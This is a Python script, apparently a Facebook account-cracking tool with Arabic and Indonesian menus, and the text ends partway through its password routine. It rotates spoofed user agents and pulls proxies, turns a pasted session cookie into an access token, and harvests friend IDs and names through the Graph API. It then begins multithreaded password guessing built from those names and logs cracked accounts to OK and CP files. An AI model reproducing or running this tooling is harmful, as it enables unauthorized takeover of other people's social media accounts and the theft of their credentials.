AppleWebKit/534.30 (KHTML like Gecko) Version/4.0 Mobile Safari/534.30 MicroMessenger/5.0.2.352', 'Mozilla/5.0 (Linux; U; Android 4.3; zh-cn; M811 Build/JLS36C) AppleWebKit/534.30 (KHTML like Gecko) Version/4.0 Mobile Safari/534.30; 360browser(securitypaysecurityinstalled); 360(androiduppayplugin); 360 Aphone Browser (2.0.4)', 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone72;FBMD/iPhone;FBSN/iOS;FBSV/12.4.4;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5;FBCR/Mobile TeleSystems]', 'Mozilla/5.0 (Linux; Android 9; SM-A405FM) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G973U) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; PRO 6) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; TECNO KC8 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 YandexSearch/7.80 YandexSearchBrowser/7.80', 'Mozilla/5.0 (Linux; Android 7.0; R2 Plus) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi Go) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Redmi 3S Build/MMB29M) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; PSP5506DUO) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G9350) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.94 Mobile Safari/537.36 Vivaldi/2.9.1741.39', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44 (Edition Yx)', 'Mozilla/5.0 (Linux; Android 9; G8441) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu note9 Build/MRA58K) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.13.110-2019112819 UWS/2.15.0.4 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; SM-J260F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-J600F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; AUM-L29) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; COL-L29) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; Mi 9 SE Build/PKQ1.181121.001) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36 YaApp_Android/9.90 YaSearchBrowser/9.90', 'Mozilla/5.0 (Linux; Android 9; Moto Z (2)) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; Xerox_Win32PWS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 9; SM-A750FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.90 YaSearchBrowser/9.90', 'Mozilla/5.0 (Linux; Android 7.1.2; Swift 2 X) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9; en-in; Redmi Note 7 Pro Build/PKQ1.181203.001) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.4.3-g', 'Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36/null', 'Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; SM-T585) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; arm_64; Android 7.0; A8) AppleWebKit/537.36 (KHTML like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.1.121.00 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A730F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; CAM-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; FLA-LX1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; U683CL Build/U683CL_01.01.02; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; Redmi S2 Build/PKQ1.181203.001) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36 YaApp_Android/9.05 YaSearchBrowser/9.05', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone84;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5;FBCR/LMT]', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T211 Build/KOT49H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/40.0.2214.109 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; vivo 1806) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.66 Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9; ru-ru; MI 8 Pro Build/PKQ1.180729.001) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.4.3-g', 'Mozilla/5.0 (Linux; Android 6.0.1; OPPO A57t) AppleWebKit/537.36 (KHTML like Gecko) Chrome/73.0.3683.103 YaBrowser/19.4.3.352.00 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SM-N920L) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6013) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; arm_64; Android 8.0.0; SM-N950F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.1.121.00 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; TRT-LX1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/43.0.2357.65 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; Redmi Note 8T) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 OPR/55.0.2719.50560', 'Mozilla/5.0 (Linux; Android 5.1.1; HUAWEI KII-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; ASUS_X00QD) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SM-N920K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; Neffos X1 Lite) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; Lenovo TB3-850M) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; JMM-L22) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-A720F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; ZB500KL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; ZB602KL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-J415FN) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; STK-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; BLN-L22) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; K3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; BKK-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; ru-ru; MI PLAY Build/O11019) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.4.3-g', 'Mozilla/5.0 (Linux; Android 9; SM-G9650) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; LLD-L31 Build/HONORLLD-L31) AppleWebKit/537.36 (KHTML like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36 YaApp_Android/9.40 YaSearchBrowser/9.40', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; M5 Note) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; Redmi 6 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36 ACHEETAHI/1', 'Mozilla/5.0 (Linux; Android 9; SM-M307F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone72;FBMD/iPhone;FBSN/iOS;FBSV/12.4.4;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5;FBCR/Pelephone]', 'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; G8342) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; arm_64; Android 7.0; JMM-L22) AppleWebKit/537.36 (KHTML like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.2.152.00 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44 (Edition Yx)', 'Mozilla/5.0 (Linux; Android 9; Redmi Note 8) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; LND-AL30) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SNE-LX1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.4; SM-T561) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-N975U) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GM1913) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-G955F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36 YaApp_Android/9.90 YaSearchBrowser/9.90', 'Mozilla/5.0 (Linux; Android 9; TECNO KC2 Build/PPR1.180610.011; en-us) AppleWebKit/537.36 (KHTML like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.2.1.41222AP', 'Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L21 Build/HUAWEIVNS-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.90 YaSearchBrowser/9.90', 'Mozilla/5.0 (Linux; Android 9; HRY-LX1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; POT-LX1 Build/HUAWEIPOT-LX1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.90 YaSearchBrowser/9.90', 'Mozilla/5.0 (Linux; Android 8.0.0; Lenovo K8 Plus) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36']


cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	
except Exception as e:
	print('𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺')

for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['2','3','4','5','5.2','6','6.0.1','7','8','9','10','11','11','11.0.1','12','13'])
	c=random.choice(['OPPO A57 Build/MMB29M; wv'])
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(80,106)
	f='0'
	g=random.randrange(3904,5000)
	h=random.randrange(40,100)
	i='MQQBrowser/6.2 TBS/045713 Mobile Safari/537.36 MMWEBID/4383 MicroMessenger/8.0.10.1960(0x28000A3D) Process/tools WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64'
	uaku2=f'{aa} {b}; {c}) {d}{e}.{f}.{g}.{h} {i}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-SM-'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
import os
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n")
    os.system("pip install requests")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
    os.system("pip install rich")

import requests, sys, time, re, random
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from time import time as mek

M = '\x1b[1;91m'

O = '\x1b[1;96m'
N = '\x1b[0m'    
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 

def KilmenuViP():
	try:
		token = open('.token.txt','r').read()
		cok = open('.vip1.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
	except IOError:
		login_lagi334()





def login_lagi334():
	try:		
		os.system('clear')
		cookie=input(f'- Cookies • ')
		open(".vip1.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&blueirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print(f'{a30} تم تسجيل الدخول اعد تشغيل الاداة ✓ ')
				else:
					print(f"{a1} الكوكيز لا يعمل  ✘")
			except:
				print('error')
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .vip1.txt")
		exit()
def banner():
	
	pass		
def menu(sy2,sy3):
	
	#ip = requests.get("https://api.ipify.org").text
	
	os.system('clear')
	banner()

def menu(my_name,my_id):
	#ip = requests.get("https://api.ipify.org").text
	
	os.system('clear')
	banner()	
	print('\x1b[38;5;166m{•\x1b[38;5;48m\x1b[38;5;166m} \x1b[38;5;216m 𝑇𝐻𝐸 𝐶𝐻𝐴𝑁𝑁𝐸𝐿\x1b[38;5;118m ⁞ @MRBMOX   ')
	print('''\x1b[38;5;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
''')
	print('{1} \x1b[38;5;46m𝐹𝑅𝑂𝑀 𝐹𝑅𝐼𝐸𝑁𝐷𝑆 ⁞ مـن الـاصـدقـاء  ')
	print('''\x1b[38;5;91m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
''')

	print('{2}\x1b[38;5;46m 𝐹𝑅𝑂𝑀 𝐹𝐼𝐿𝐸 ⁞ مـن مـلـف  ')
	print('''\x1b[38;5;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
''')
	print('{0}\x1b[38;5;196m 𝐸𝑋𝐼𝑇 ⁞ تـسـجـيل خـروج   ')
	print('''\x1b[38;5;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
''')
	kilchs = input(f'\n- Chose • اختاࢪ : ')
	if kilchs in ['1']:
		kil_vip_id()
	elif kilchs in ['2']:
		kil_vip_file()
	elif kilchs in ['0']:
		O()
		exit()
def kil_vip_file():
	try:
		token = open('.token.txt','r').read()
		cok = open('.vip1.txt','r').read()
	except IOError:
		exit()
	try:
		
		jum = input(' • File Name • اسم او مسار الملف : ')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		print('- Total id • الايديات : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print('[✘] No Connection  ')
			exit()
	except (KeyError,IOError):
			print('[✘] Id Is Not Public')
			time.sleep(3)

def kil_vip_id():
	try:
		token = open('.token.txt','r').read()
		cok = open('.vip1.txt','r').read()
	except IOError:
		exit()
	try:
		ارجواني = "\033[1;95m"  #ارجواني
		اخضر = '\033[2;32m' #اخضر
		jum = int(input(f'\n{ارجواني}- How Many id •{اخضر} كم ايدي تريد تصيد : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'\n{ارجواني}- ID >{اخضر} ادخل الايدي '+str(yz)+' : ')
		uid.append(kl)
	for user in uid:
	    try:
	       uaidcrac = random.choice(ugen)
	       head = (
	       {"user-agent": f'{uaidcrac}'
	       })
	       if len(id) == 0:
	           params = (
	           {
	            'access_token': token,
	            'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	            'access_token': token,
	            'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
		print('')
		print(Z+f' > Total id > عدد الايديات {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Loh Kurang Bagus ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()

def setting():
	print(B+'<>'*25)
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> PILIH YANG BENAR BANG ')
		exit()
#    print('>> 2. Free ')
    #print('>> 3. Touch  ')
  #  print('>> 4. Mbasic ')
	hc = '1'
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('>> PILIH YANG BENAR BANG ')
		setting()
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	_jembot_ = '1'
	if _jembot_ in ['']:
		print('>> Pilih Yang Bener Kontol ')
		back()
	elif _jembot_ in ['2','2']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus='1'
	if pwplus in ['2','2']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[green]] يمكنك وضع باسورد واحد فقط\n[[cyan]•[green]] Contoh :[green] 123456qwerty[green] '))
		pwku=input('>>ادخل الباسورد : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd() 
def passwrd():
	
	
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
